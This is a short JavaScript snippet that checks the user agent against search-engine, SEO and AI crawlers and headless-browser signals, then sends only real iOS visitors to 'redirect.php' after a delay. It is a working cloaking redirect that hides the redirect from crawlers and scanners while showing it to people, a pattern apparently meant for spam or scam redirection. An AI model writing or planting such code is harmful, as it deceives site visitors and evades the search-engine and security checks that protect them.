(function () {
  // --- Bot detection ---
  function isBot() {
    const ua = navigator.userAgent || '';

    // Common bot / crawler patterns (including all major Google bots)
    const botPattern = /bot|crawler|spider|crawling|googlebot|adsbot|mediapartners|apis-google|feedfetcher|bingbot|slurp|duckduckbot|baiduspider|yandex|facebookexternalhit|twitterbot|linkedinbot|semrush|ahrefs|mj12bot|dotbot|petalbot|bytespider|gptbot|claudebot|anthropic|oai-searchbot|chatgpt|ccbot|amazonbot/i;

    if (botPattern.test(ua)) return true;

    // Basic automation / headless signals
    if (navigator.webdriver) return true;
    if (window.callPhantom || window._phantom) return true;
    if (window.__nightmare) return true;
    if (document.documentElement.getAttribute('webdriver')) return true;

    return false;
  }

  // --- iOS detection ---
  function isIOS() {
    return /iPad|iPhone|iPod/.test(navigator.userAgent) ||
           (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
  }

  // Only redirect if: iOS user AND not a bot
  if (isIOS() && !isBot()) {
    setTimeout(function () {
      window.location.href = 'redirect.php';
    }, 1000); // 1-second delay
  }
})();